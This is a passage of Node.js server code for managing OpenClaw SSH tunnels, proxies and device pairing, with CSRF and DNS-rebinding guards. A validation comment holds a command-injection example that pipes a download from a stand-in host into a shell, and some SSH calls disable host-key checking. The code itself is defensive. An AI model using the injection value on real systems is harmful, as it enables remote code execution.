  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  const existing = store.openclawConnections.get(params.id);
  if (!existing) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }
  // Check for port conflicts if localPort is being changed
  if (body.localPort !== undefined && body.localPort !== existing.localPort) {
    const portCheck = porthub.checkPort(body.localPort);
    if (!portCheck.available) {
      return errorResponse(res, 409, `Port ${body.localPort} is already in use by ${portCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  }
  // Resolve bridgePort the same way POST does (#483). 'auto' is idempotent on
  // update: a connection that already has a bridge port keeps it (re-saving an
  // edit form must not churn ports); only a bridge-less connection allocates.
  if (body.bridgePort === 'auto') {
    if (existing.bridgePort) {
      body.bridgePort = existing.bridgePort;
    } else {
      try {
        body.bridgePort = porthub.nextFreePort({ range: [3201, 3300] });
      } catch (err) {
        return errorResponse(res, 409, err.message, 'PORT_EXHAUSTED');
      }
    }
  } else if (body.bridgePort !== undefined && body.bridgePort !== null && body.bridgePort !== ''
      && body.bridgePort !== existing.bridgePort) {
    const bridgeCheck = porthub.checkPort(body.bridgePort);
    if (!bridgeCheck.available) {
      return errorResponse(res, 409, `Bridge port ${body.bridgePort} is already in use by ${bridgeCheck.leasedBy || 'system process'}`, 'PORT_CONFLICT');
    }
  }
  try {
    const connection = store.openclawConnections.update(params.id, body);
    // Lease reconciliation (#483): the create path leases local/bridge ports
    // under oc-direct-<id> and DELETE releases them, but a port change via PUT
    // used to leave the old lease held forever and the new port unleased —
    // reopening the #352 allocate→bind race for edited connections. Mirror the
    // create/delete lifecycle: kill the now-misconfigured standalone tunnel
    // (killTunnel also releases its tracked localPort), release the stale
    // leases, then re-lease the connection's current ports.
    const localChanged = connection.localPort !== existing.localPort;
    const bridgeChanged = connection.bridgePort !== existing.bridgePort;
    if (localChanged || bridgeChanged) {
      const leaseName = `oc-direct-${connection.id}`;
      tunnel.killTunnel(leaseName);
      if (localChanged && existing.localPort) {
        porthub.releasePort(existing.localPort);
      }
      if (bridgeChanged && existing.bridgePort) {
        porthub.releasePort(existing.bridgePort);
      }
      if (connection.localPort) {
        porthub.registerPort(connection.localPort, leaseName, 'openclaw-tunnel', { permanent: true });
      }
      if (connection.bridgePort) {
        porthub.registerPort(connection.bridgePort, leaseName, 'openclaw-bridge', { permanent: true });
      }
    }
    openclawVersion.invalidate(params.id); // #296: instanceDir may have changed → drop stale cache
    jsonResponse(res, 200, connection);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'CONFLICT') {
      return errorResponse(res, 409, err.message, 'CONFLICT');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
});

// DELETE /api/openclaw/connections/:id
route('DELETE', '/api/openclaw/connections/:id', (_req, res, params) => {
  try {
    // Kill any active standalone tunnel and release port before deleting
    const conn = store.openclawConnections.get(params.id);
    if (conn) {
      tunnel.killTunnel(`oc-direct-${conn.id}`);
      if (conn.localPort) {
        porthub.releasePort(conn.localPort);
      }
      if (conn.bridgePort) {
        porthub.releasePort(conn.bridgePort);
      }
    }
    store.openclawConnections.delete(params.id);
    openclawVersion.invalidate(params.id); // #296: drop any cached version for the deleted connection
    jsonResponse(res, 200, { ok: true, id: params.id });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// POST /api/openclaw/test — Test SSH connectivity + gateway health
route('POST', '/api/openclaw/test', (_req, res, _params, body) => {
  if (!body || !body.host || !body.sshUser || !body.sshKeyPath) {
    return errorResponse(res, 400, 'host, sshUser, and sshKeyPath are required', 'BAD_REQUEST');
  }
  // #312: these fields are interpolated into an `ssh ...` shell command below,
  // so shape-validate them (reusing the detect endpoint's guards — one source
  // of truth) before any shell-out. Rejects `;`, `$(...)`, backticks, etc.
  const unsafe = openclawDetect.unsafeReason({
    host: body.host,
    sshUser: body.sshUser,
    sshKeyPath: body.sshKeyPath
  });
  if (unsafe) {
    return errorResponse(res, 400, unsafe, 'BAD_REQUEST');
  }
  // #312: `port`/`localPort` are interpolated into the `curl …:<port>/healthz`
  // shell command below, so they must be plain integers in range — reject
  // anything else (e.g. `localPort = "1;curl evil|sh"`) before shelling out.
  for (const [name, val] of [['port', body.port], ['localPort', body.localPort]]) {
    if (val === undefined || val === null || val === '') continue;
    const n = Number(val);
    if (!Number.isInteger(n) || n < 1 || n > 65535) {
      return errorResponse(res, 400, `${name} must be an integer between 1 and 65535`, 'BAD_REQUEST');
    }
  }

  const keyPath = body.sshKeyPath.replace(/^~/, process.env.HOME || '');
  const port = body.port || 18789;
  const host = body.host;
  const sshUser = body.sshUser;

  // Test SSH connectivity with a short timeout
  const { execSync } = require('node:child_process');
  const results = { ssh: false, gateway: false, errors: [] };

  try {
    execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=accept-new -i "${keyPath}" ${sshUser}@${host} "echo ok"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    );
    results.ssh = true;
  } catch (err) {
    results.errors.push(`SSH: ${err.stderr || err.message}`);
  }

  // Test gateway health if a localPort or port is provided
  if (body.localPort || port) {
    const testPort = body.localPort || port;
    try {
      const output = execSync(
        `curl -s -m 5 http://localhost:${testPort}/healthz`,
        { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
      );
      try {
        const parsed = JSON.parse(output);
        results.gateway = !!parsed.ok;
      } catch {
        results.gateway = false;
        results.errors.push(`Gateway: unexpected response: ${output.slice(0, 200)}`);
      }
    } catch (err) {
      results.errors.push(`Gateway: ${err.stderr || err.message}`);
    }
  }

  jsonResponse(res, 200, results);
});

// POST /api/openclaw/connections/:id/tunnel — Start tunnel for standalone access
route('POST', '/api/openclaw/connections/:id/tunnel', async (_req, res, params, body) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  const extraForwards = conn.bridgePort ? [{ localPort: conn.bridgePort, remotePort: conn.bridgePort }] : [];
  const tunnelResult = await tunnel.ensureTunnel(`oc-direct-${conn.id}`, {
    host: conn.host,
    port: conn.port,
    localPort: conn.localPort,
    sshUser: conn.sshUser,
    sshKeyPath: conn.sshKeyPath,
    force: body && body.force === true,
    extraForwards
  });

  if (!tunnelResult.ok) {
    return errorResponse(res, 502, `Tunnel failed: ${tunnelResult.error}`, 'TUNNEL_ERROR');
  }

  const tokenParam = conn.gatewayToken ? `#token=${encodeURIComponent(conn.gatewayToken)}` : '';
  // Proxy through TangleClaw so remote browsers can reach the tunnel on the TangleClaw host
  const webuiUrl = `/openclaw-direct/${encodeURIComponent(conn.id)}/chat?session=main${tokenParam}`;

  jsonResponse(res, 200, {
    ok: true,
    alreadyUp: tunnelResult.alreadyUp,
    webuiUrl,
    localPort: conn.localPort
  });
});

// GET /api/openclaw/connections/:id/tunnel — Get tunnel status for a connection
route('GET', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  const status = await tunnel.detectTunnel(conn.localPort, conn.host);
  const tracked = tunnel.getTunnel(`oc-direct-${conn.id}`);

  jsonResponse(res, 200, {
    localPort: conn.localPort,
    host: conn.host,
    active: status.active,
    connectable: status.connectable,
    pid: status.pid,
    tracked: !!tracked
  });
});

// DELETE /api/openclaw/connections/:id/tunnel — Kill tunnel for a connection
route('DELETE', '/api/openclaw/connections/:id/tunnel', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  // Try tracked kill first, then fall back to port-based kill
  const tracked = tunnel.killTunnel(`oc-direct-${conn.id}`);
  const byPort = await tunnel.killTunnelByPort(conn.localPort, conn.host);

  // Also kill any project-scoped tunnels using this connection's port
  const projectTunnels = tunnel.listTunnels().filter(t => t.localPort === conn.localPort);
  for (const t of projectTunnels) {
    tunnel.killTunnel(t.projectName);
  }

  // Mark any active webui sessions using this connection as killed
  const connections = store.openclawConnections.list();
  const thisConn = connections.find(c => c.id === params.id);
  if (thisConn) {
    const projects = store.projects.list();
    for (const proj of projects) {
      if (proj.engineId === `openclaw:${params.id}`) {
        const active = store.sessions.getActive(proj.id);
        if (active && active.sessionMode === 'webui') {
          store.sessions.kill(active.id, 'Tunnel killed from connection panel');
          // Forget the killed session's Medusa listener + id (MED-2K9P Chunk 04)
          // so a tunnel-killed webui session doesn't strand a ghost roster peer.
          medusa.forgetSession({ projectPath: proj.path, sessionId: active.id });
        }
      }
    }
  }

  // #288: report whether the port was actually freed — the old route returned
  // ok:true unconditionally, hiding the exact zombie-survives-kill case this
  // fix exists to surface. `released:false` means the operator still has a
  // stuck tunnel and should escalate (manual kill), not assume recovery.
  jsonResponse(res, 200, {
    ok: byPort.released !== false,
    killedPid: byPort.pid,
    released: byPort.released,
    error: byPort.error || null,
    localPort: conn.localPort
  });
});

// POST /api/openclaw/connections/:id/approve-pending — Auto-approve pending device pairing
route('POST', '/api/openclaw/connections/:id/approve-pending', async (_req, res, params) => {
  const conn = store.openclawConnections.get(params.id);
  if (!conn) {
    return errorResponse(res, 404, `Connection "${params.id}" not found`, 'NOT_FOUND');
  }

  if (!conn.gatewayToken) {
    return errorResponse(res, 400, 'No gateway token configured — cannot approve pairing', 'BAD_REQUEST');
  }

  const keyPath = conn.sshKeyPath.replace(/^~/, process.env.HOME || '');
  const { execSync } = require('node:child_process');

  // List pending devices via the gateway's WebSocket CLI.
  // Filter by published gateway port so we pick the right container on multi-tenant
  // hosts (a single Docker host often runs several unrelated stacks side-by-side).
  // Falls back to head -1 as a safety net if multiple containers somehow publish the
  // same port (shouldn't happen given PortHub registration).
  let pending;
  try {
    const listOutput = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker ps --filter 'publish=${conn.port}' --format '{{.Names}}' | head -1"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    if (!listOutput) {
      return jsonResponse(res, 200, { approved: false, reason: 'No Docker container found' });
    }

    const containerName = listOutput;
    const devicesJson = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker exec ${containerName} openclaw devices list --json"`,
      { timeout: 15000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    pending = JSON.parse(devicesJson).pending || [];
  } catch (err) {
    log.warn('Auto-approve: failed to list devices', { error: err.message });
    return jsonResponse(res, 200, { approved: false, reason: 'Failed to list pending devices' });
  }

  if (pending.length === 0) {
    return jsonResponse(res, 200, { approved: false, reason: 'No pending requests' });
  }

  // Approve the latest pending request — same publish-port filter as above.
  // `openclaw devices approve --latest` is a PREVIEW (returns which request
  // would be approved, doesn't approve); the actual approval requires the
  // requestId as a positional argument. Sort pending by `ts` desc and use
  // the most recent one's requestId.
  const latestPending = pending.slice().sort((a, b) => (b.ts || 0) - (a.ts || 0))[0];
  const requestId = latestPending && latestPending.requestId;
  if (!requestId) {
    return jsonResponse(res, 200, { approved: false, reason: 'Pending entry missing requestId' });
  }

  try {
    const containerName = execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker ps --filter 'publish=${conn.port}' --format '{{.Names}}' | head -1"`,
      { timeout: 10000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    ).trim();

    execSync(
      `ssh -o BatchMode=yes -o ConnectTimeout=5 -o StrictHostKeyChecking=no -i "${keyPath}" ${conn.sshUser}@${conn.host} ` +
      `"\\$HOME/.local/bin/docker exec ${containerName} openclaw devices approve ${requestId} --token ${conn.gatewayToken} --json"`,
      { timeout: 15000, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }
    );

    log.info('Auto-approved device pairing', { connection: conn.name, pendingCount: pending.length });
    return jsonResponse(res, 200, { approved: true, count: pending.length });
  } catch (err) {
    log.warn('Auto-approve: failed to approve', { error: err.message });
    return jsonResponse(res, 200, { approved: false, reason: `Approve failed: ${err.message}` });
  }
});

// ── OpenClaw Proxy ──

/**
 * Resolve the local port for an OpenClaw connection from a project name.
 * @param {string} projectName - Project name
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPort(projectName) {
  const project = store.projects.getByName(projectName);
  if (!project) return null;
  const engineId = project.engineId;
  if (!engineId || !engineId.startsWith('openclaw:')) return null;
  const connId = engineId.split(':')[1];
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Resolve the local port for a standalone OpenClaw connection by ID.
 * @param {string} connId - Connection ID
 * @returns {{ localPort: number, conn: object }|null}
 */
function resolveOpenclawPortDirect(connId) {
  const conn = store.openclawConnections.get(connId);
  if (!conn) return null;
  return { localPort: conn.localPort, conn };
}

/**
 * Strip frame-blocking headers from proxied OpenClaw responses so the UI can load in an iframe.
 * @param {object} headers - Response headers from upstream
 * @returns {object}
 */
function _stripFrameBlockers(headers) {
  const out = { ...headers };
  delete out['x-frame-options'];
  if (out['content-security-policy']) {
    out['content-security-policy'] = out['content-security-policy']
      .replace(/frame-ancestors\s+[^;]+;?\s*/g, '');
  }
  return out;
}

/**
 * Build proxy headers for OpenClaw requests, rewriting origin/referer to match the target
 * and injecting the gateway token for server-side auth.
 * @param {object} headers - Original request headers
 * @param {number} localPort - Target local port
 * @param {string|null} [gatewayToken] - Gateway bearer token
 * @returns {object}
 */
function _openclawProxyHeaders(headers, localPort, gatewayToken) {
  const out = { ...headers, host: `127.0.0.1:${localPort}` };
  const localOrigin = `http://127.0.0.1:${localPort}`;
  if (out.origin) out.origin = localOrigin;
  if (out.referer) out.referer = localOrigin + '/';
  // The OpenClaw gateway authenticates via the injected gateway token, never the
  // browser's Authorization header — in caddy-gated ingress mode that header is the
  // operator's Basic credential, meaningless to the gateway and not to be leaked to
  // the downstream host. Always strip the incoming header, then set Bearer only when
  // a token is configured (#470).
  delete out.authorization;
  if (gatewayToken) out.authorization = `Bearer ${gatewayToken}`;
  return out;
}

/**
 * Build the raw HTTP/1.1 request line + header block for a proxied OpenClaw
 * WebSocket handshake. The WS upgrade path writes headers to a socket by hand
 * rather than through `http.request`, so this is the WS-side mirror of
 * {@link _openclawProxyHeaders} and MUST apply the same Authorization rule (#470):
 * the incoming `Authorization` header (the operator's caddy Basic credential in
 * gated mode) is always dropped, and a `Bearer <gatewayToken>` is injected when a
 * token is configured. `Host` is pinned to the upstream and `Origin`/`Referer` are
 * rewritten to the local origin. Terminates with the blank line ending the block.
 * @param {object} headers - Incoming request headers (`req.headers`, lowercased keys).
 * @param {string} targetUrl - Rewritten request target for the upstream.
 * @param {number} localPort - Upstream tunnel port on 127.0.0.1.
 * @param {string|null} [gatewayToken] - Gateway bearer token, or null/undefined.
 * @returns {string[]} Lines to `.join('\r\n')` before writing to the proxy socket.
 */
function _openclawWsRequestLines(headers, targetUrl, localPort, gatewayToken) {
  const localOrigin = `http://127.0.0.1:${localPort}`;
  const lines = [`GET ${targetUrl} HTTP/1.1`, `Host: 127.0.0.1:${localPort}`];
  for (const [key, value] of Object.entries(headers)) {
    const k = key.toLowerCase();
    if (k === 'host') continue;
    if (k === 'authorization') continue; // stripped; gateway token injected below (#470)
    if (k === 'origin') { lines.push(`origin: ${localOrigin}`); continue; }
    if (k === 'referer') { lines.push(`referer: ${localOrigin}/`); continue; }
    lines.push(`${key}: ${value}`);
  }
  if (gatewayToken) lines.push(`authorization: Bearer ${gatewayToken}`);
  lines.push('', '');
  return lines;
}

/**
 * Proxy an HTTP request to an OpenClaw instance via its local tunnel port.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 * @param {string} projectName - Project name from URL
 * @param {string} subPath - Remaining path after /openclaw/:project/
 */
function proxyToOpenclaw(req, res, projectName, subPath) {
  const resolved = resolveOpenclawPort(projectName);
  if (!resolved) {
    return errorResponse(res, 404, 'OpenClaw connection not found for project', 'NOT_FOUND');
  }

  const { localPort } = resolved;
  const targetPath = '/' + subPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : '');

  const proxyReq = http.request({
    hostname: '127.0.0.1',
    port: localPort,
    path: targetPath,
    method: req.method,
    headers: _openclawProxyHeaders(req.headers, localPort, resolved.conn.gatewayToken)
  }, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, _stripFrameBlockers(proxyRes.headers));
    proxyRes.pipe(res);
  });

  proxyReq.on('error', (err) => {
    log.warn('OpenClaw proxy error', { error: err.message, project: projectName });
    errorResponse(res, 502, 'OpenClaw service unavailable', 'BAD_GATEWAY');
  });

  req.pipe(proxyReq);
}

// ── Terminal Proxy ──

/**
 * Proxy an HTTP request to the ttyd backend.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 * @param {string} pathname
 */
function proxyToTtyd(req, res, pathname) {
  const config = store.config.load();
  const target = caddy.ttydConnectTarget(config);
  const targetPath = pathname.replace(/^\/terminal/, '') || '/';

  // In caddy mode ttyd is on a Unix socket (`socketPath`); otherwise a TCP port.
  // http.request accepts either `socketPath` or `hostname`+`port`.
  const reqOptions = {
    path: targetPath + (req.url.includes('?') ? '?' + req.url.split('?')[1] : ''),
    method: req.method,
    headers: {
      ...req.headers,
      host: target.hostHeader
    }
  };
  if (target.socketPath) {
    reqOptions.socketPath = target.socketPath;
  } else {
    reqOptions.hostname = target.host;
    reqOptions.port = target.port;
  }

  const proxyReq = http.request(reqOptions, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', (err) => {
    log.warn('ttyd proxy error', { error: err.message });
    errorResponse(res, 502, 'Terminal service unavailable', 'BAD_GATEWAY');
  });

  req.pipe(proxyReq);
}

/**
 * Handle WebSocket upgrade for terminal proxy.
 * @param {http.IncomingMessage} req
 * @param {import('net').Socket} socket
 * @param {Buffer} head
 */
/**
 * Does a WebSocket handshake's `Origin` name the same host we are serving?
 *
 * Compared by HOST, not by full origin string: the dashboard is reached over
 * https through Caddy on one port and over http directly on another, and both
 * are legitimately the same machine — a strict origin match would break the
 * terminal on the install this release makes default. An unparseable Origin is
 * refused rather than waved through.
 *
 * @param {string} origin - The `Origin` header.
 * @param {string|undefined} host - The `Host` header.
 * @returns {boolean}
 */
function _isSameOriginUpgrade(origin, host) {
  let originHost;
  let targetHost;
  try {
    originHost = new URL(origin).hostname;
    // Parsed, never split on ':'. An IPv6 literal Host is bracketed
    // (`[fd7a:115c::1]:3102`), so splitting yields `'['` while the Origin side
    // yields the full `[fd7a:115c::1]` — they can never match, and every
    // terminal socket gets destroyed for an operator whose dashboard is on an
    // IPv6 address. Tailscale assigns every node an `fd7a:115c::/48` address,
    // so that is a normal way to reach this product, not an edge case. The
    // dashboard would load and the terminal would silently never connect.
    targetHost = new URL(`http://${host || 'localhost'}`).hostname;
  } catch {
    return false;
  }
  return originHost === targetHost;
}

function handleUpgrade(req, socket, head) {
  const urlObj = reqUrl(req);

  // The cross-site guard has to be here too, and this is the sharper half.
  //
  // WebSockets are NOT subject to the same-origin policy: any page can open one
  // to any host, no preflight, no CORS. So the reasoning that protects the HTTP
  // routes — loopback means it came through Caddy — fails harder here, because a
  // page the operator merely visits can connect straight to the ungated
  // 127.0.0.1:<serverPort> listener and then read AND write on the socket, which
  // a cross-site form post cannot do. `/terminal/*` proxies to a `--writable`
  // ttyd, so that is a shell; the OpenClaw branches attach the operator's
  // gateway token.
  //
  // Browsers always send `Origin` on a WebSocket handshake and it cannot be
  // forged from script, so this is the check that exists for exactly this case.
  // Non-browser clients (the OpenClaw CLI, scripts) omit it and are allowed —
  // they are not a cross-site vector — which keeps every existing consumer
  // working, the same contract as the HTTP guard.
  const origin = req.headers.origin;
  if (origin && !_isSameOriginUpgrade(origin, req.headers.host)) {
    log.warn('Refused cross-origin WebSocket upgrade', { path: urlObj.pathname, origin });
    socket.destroy();
    return;
  }

  // #864 — the check above only proves Origin and Host AGREE, which they do
  // under DNS rebinding: both read `evil.example`, and the handshake proceeds
  // to a `--writable` ttyd. Requiring the name to be one this install serves is
  // what makes them agree on something true.
  //
  // Gated on `origin` for the same reason the check above is: a browser always
  // sends it, a non-browser client (the OpenClaw CLI, scripts) does not and is
  // not a cross-site vector. Without that gate this would refuse every
  // headless consumer that reaches the socket by an address the allowlist has
  // no way to know about.
  if (origin) {
    const wsCfg = _loadConfigOrNull();
    const wsAllowlist = wsCfg ? _servedHostsOrEmpty(wsCfg) : new Set();
    // No setup carve-out here on purpose: the wizard completes over HTTP, and
    // nothing in first run opens a terminal socket. An exemption would be dead
    // code guarding the route with the worst payoff — `/terminal/*` proxies to
    // a `--writable` ttyd.
    if (!_hostIsAllowed(req.headers.host, wsAllowlist)) {
      log.warn('Refused WebSocket upgrade for an unserved Host', {
        path: urlObj.pathname, origin, host: req.headers.host
      });
      socket.destroy();
      return;
    }
  }

  // OpenClaw direct WebSocket proxy — /openclaw-direct/:connId/*
  if (urlObj.pathname.startsWith('/openclaw-direct/')) {
    const parts = urlObj.pathname.split('/'); // ['', 'openclaw-direct', connId, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const connId = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPortDirect(connId);
      if (!resolved) {
        socket.destroy();
        return;
      }
      const subPath = parts.slice(3).join('/');
      const targetUrl = '/' + subPath + (urlObj.search || '');

      const net = require('node:net');
      const proxySocket = net.connect(resolved.localPort, '127.0.0.1', () => {
        const reqHeaders = _openclawWsRequestLines(
          req.headers, targetUrl, resolved.localPort, resolved.conn.gatewayToken
        );

        proxySocket.write(reqHeaders.join('\r\n'));
        if (head.length > 0) {
          proxySocket.write(head);
        }

        proxySocket.pipe(socket);
        socket.pipe(proxySocket);
      });

      proxySocket.on('error', () => socket.destroy());
      socket.on('error', () => proxySocket.destroy());
      socket.on('close', () => proxySocket.destroy());
      proxySocket.on('close', () => socket.destroy());
      return;
    }
    socket.destroy();
    return;
  }

  // OpenClaw WebSocket proxy — /openclaw/:project/*
  if (urlObj.pathname.startsWith('/openclaw/')) {
    const parts = urlObj.pathname.split('/'); // ['', 'openclaw', project, ...rest]
    if (parts.length >= 3 && parts[2]) {
      const ocProject = decodeURIComponent(parts[2]);
      const resolved = resolveOpenclawPort(ocProject);
      if (!resolved) {
        socket.destroy();
        return;
      }
      const subPath = parts.slice(3).join('/');
      const targetUrl = '/' + subPath + (urlObj.search || '');

      const net = require('node:net');
      const proxySocket = net.connect(resolved.localPort, '127.0.0.1', () => {
        const reqHeaders = _openclawWsRequestLines(
          req.headers, targetUrl, resolved.localPort, resolved.conn.gatewayToken
        );

        proxySocket.write(reqHeaders.join('\r\n'));
        if (head.length > 0) {
          proxySocket.write(head);
        }

        proxySocket.pipe(socket);
        socket.pipe(proxySocket);
      });

      proxySocket.on('error', () => socket.destroy());
      socket.on('error', () => proxySocket.destroy());
      socket.on('close', () => proxySocket.destroy());
      proxySocket.on('close', () => socket.destroy());
      return;
    }
    socket.destroy();
    return;
  }

  if (!urlObj.pathname.startsWith('/terminal')) {
    socket.destroy();
    return;
  }

  const config = store.config.load();
  const target = caddy.ttydConnectTarget(config);
  const targetPath = urlObj.pathname.replace(/^\/terminal/, '') || '/';
  const targetUrl = targetPath + (urlObj.search || '');

  const net = require('node:net');
  // caddy mode → Unix socket; direct mode → TCP host:port. net.connect accepts
  // a socket path (string) or (port, host).
  const onProxyConnect = () => {
    // Build the upgrade request to forward to ttyd
    const reqHeaders = [];
    reqHeaders.push(`GET ${targetUrl} HTTP/1.1`);
    reqHeaders.push(`Host: ${target.hostHeader}`);
    for (const [key, value] of Object.entries(req.headers)) {
      if (key.toLowerCase() === 'host') continue;
      reqHeaders.push(`${key}: ${value}`);
    }
    reqHeaders.push('', '');

    proxySocket.write(reqHeaders.join('\r\n'));
    if (head.length > 0) {
      proxySocket.write(head);
    }

    // Pipe data bidirectionally
    proxySocket.pipe(socket);
    socket.pipe(proxySocket);
  };

  const proxySocket = target.socketPath
    ? net.connect(target.socketPath, onProxyConnect)
    : net.connect(target.port, target.host, onProxyConnect);

  proxySocket.on('error', () => {
    socket.destroy();
  });

  socket.on('error', () => {
    proxySocket.destroy();
  });

  socket.on('close', () => {
    proxySocket.destroy();
  });

  proxySocket.on('close', () => {
    socket.destroy();
  });
}

// ── Version Helper ──

let _cachedVersion = null;

/**
 * The version this server reports as its own — what the process loaded, falling
 * back to `version.json` only when startup was never captured.
 * @returns {string}
 */
function _getVersion() {
  // The version this process loaded, when it is known. Reading version.json
  // here instead would answer with the DISK version, and the two diverge for
  // the whole window between a self-update's checkout and the restart that
  // loads it — so `/api/version` would confirm a release the running code is
  // not yet serving. The memo below made that worse rather than better: it is
  // filled by the first request that asks, not at boot, so an idle server that
  // is then updated freezes the *new* number and reports it indefinitely.
  //
  // Keeping this in step with `/api/server-info`'s `runningVersion` is a
  // contract, not a coincidence: the dashboard writes its version label from
  // both, and a disagreement between them is exactly the misreport this
  // function used to produce.
  const running = serverInfo.getRunningVersion();
  if (running) return running;

  // Fallback for the window before startup is captured (and for tests that
  // never capture it). Memoized because it is a synchronous read on a request
  // path.
  if (_cachedVersion) return _cachedVersion;
  try {
    const versionFile = path.join(__dirname, 'version.json');
    const data = JSON.parse(fs.readFileSync(versionFile, 'utf8'));
    _cachedVersion = data.version;
    return _cachedVersion;
  } catch {
    return 'unknown';
  }
}

// ── Request Handler ──

/**
 * Main HTTP request handler.
 * @param {http.IncomingMessage} req
 * @param {http.ServerResponse} res
 */
async function handleRequest(req, res) {
  const startTime = Date.now();
  const urlObj = reqUrl(req);
  const pathname = urlObj.pathname;
  const method = req.method.toUpperCase();

  // Reject state-changing requests a browser tells us came from another site.
  //
  // Ahead of EVERY branch, not just `/api/`. The first version of this guard sat
  // inside the `/api/` branch and left the proxies open, which was the more
  // dangerous half: `_openclawProxyHeaders` rewrites `origin` and `referer` to
  // the local origin and attaches `Bearer <gatewayToken>`, so a cross-site page
  // POSTing to `/openclaw/:project/*` would have reached the OpenClaw gateway
  // with the operator's token supplied and the tell-tale Origin laundered off
  // the request. `/terminal/*` was open the same way. Scoping a CSRF check to
  // one path prefix is how the exemption outlives the reason for it.
  //
  // Placed ahead of route matching on purpose too: a cross-site caller is
  // refused whether or not the route exists, so the guard cannot be probed for
  // which methods and paths this server implements, and adding a route later
  // can never open a hole this guard was assumed to already cover.
  //
  // Several routes authorize on "the request arrived over loopback" — most
  // sharply POST /api/auth/credential, which treats loopback as proof that the
  // perimeter already authenticated the caller. That reasoning holds for
  // traffic through Caddy, but in caddy mode this server still binds an
  // ungated 127.0.0.1:<serverPort> listener, and a browser on the operator's
  // machine can reach it directly. `parseBody` parses any body as JSON
  // regardless of Content-Type, so a form with enctype="text/plain" is a CORS
  // *simple* request: no preflight, it is sent, and its body parses. The
  // attacker cannot read the reply, which does not matter for a write — the
  // admin credential is already changed.
  //
  // Sec-Fetch-Site is the cheap correct check: every current browser sends it
  // and it cannot be forged from script. Non-browser callers (curl, scripts,
  // the agent-facing API in the project guide) omit it entirely, and they are
  // not a CSRF vector, so an absent header is allowed — this closes the
  // browser path without breaking a single existing API consumer.
  //
  // Deliberately narrow: only `cross-site` is refused. Rejecting `same-site`
  // as well would need an attacker controlling a sibling subdomain of the
  // operator's own host, and would risk breaking a legitimate multi-subdomain
  // deployment. On TangleClaw's own `/api/` surface that residual is closed a
  // different way — the JSON-body rule below refuses a form from a sibling
  // subdomain too, since a `<form>` cannot send `application/json` — so
  // `same-site` stays allowed and nothing multi-subdomain breaks (#860). That
  // rule is confined to `/api/` (its own comment says why), so on the proxied
  // prefixes the sibling-subdomain residual still stands, recorded in
  // security-model.md rather than implied here. The CSRF acceptance there,
  // whose premise "no session state in the browser" is what shipping
  // browser-cached HTTP Basic invalidated, has been re-argued rather than
  // re-cited: CSRF is now in scope, with all three guards and their residuals
  // recorded there.
  if (CSRF_UNSAFE_METHODS.has(method) && req.headers['sec-fetch-site'] === 'cross-site') {
    log.warn('Refused cross-site state-changing request', { method, path: pathname });
    return errorResponse(res, 403,
      'Cross-site requests may not change server state.', 'CROSS_SITE_FORBIDDEN');
  }

  // #864 — the check above trusts the browser's own same-origin verdict, which
  // an attacker controlling DNS can manufacture. Refuse a state-changing
  // request that arrives under a name this install does not serve.
  //
  // Scoped to the unsafe methods ON PURPOSE, not applied to every request: an
  // allowlist derived wrongly (a reverse proxy that rewrites Host, a container
  // name, a LAN address nobody registered) then degrades to "reads still work,
  // writes are refused with a named error" instead of taking the dashboard away
  // from a remote operator entirely. Tightening to an outright refusal is a
  // separate decision, to be made once the derivation has proven itself.
  // Applied only to requests that look like they came from a browser, matching
  // the contract both sibling guards state explicitly: `curl`, scripts and the
  // agent-facing API in the project guide send neither header and are not a
  // cross-site vector, so they keep working under any `Host` (a container name,
  // a proxy rewrite). This costs the guard nothing — a rebound page IS a
  // browser, and a browser cannot suppress `Sec-Fetch-Site` from script, so the
  // attack always carries the marker that brings it back into scope.
